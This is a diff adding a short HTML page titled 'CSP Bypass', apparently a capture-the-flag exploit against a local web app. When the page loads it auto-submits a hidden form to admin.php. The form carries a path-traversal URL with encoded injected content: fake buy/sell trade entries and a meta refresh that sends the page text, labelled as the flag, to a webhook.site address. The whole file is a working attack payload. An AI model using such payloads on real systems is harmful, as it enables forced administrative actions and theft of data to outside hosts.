@@ -1,0 +1,14 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CSP Bypass</title>
+</head>
+<body onload="document.getElementById('f').submit()">
+  <!-- First form submits to admin.php to process the flag transaction -->
+  <form id="f" action="http://localhost:5000/admin.php" method="POST">
+    <input type="hidden" name="url"
+      value="http://localhost:5000/admin.php/../index.php?html=-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20BUY%0A-%20amount%3A%201000000%0A%20%20currency%3A%20ZZZ%0A%20%20op%3A%20SELL%0A-%20amount%3A%201%0A%20%20currency%3A%20FL%0A%20%20op%3A%20BUY%0A%0A%3Cmeta%20http-equiv%3D%22refresh%22%20content%3D%222%3Burl%3Dhttps%3A%2F%2Fwebhook.site%2F1368f66f-01e2-4d27-9d16-e8c0a829ffd5%2F%3Fflag%3D%22%2Bdocument.body.innerText%3E">
+  </form>
+</body>
+</html>
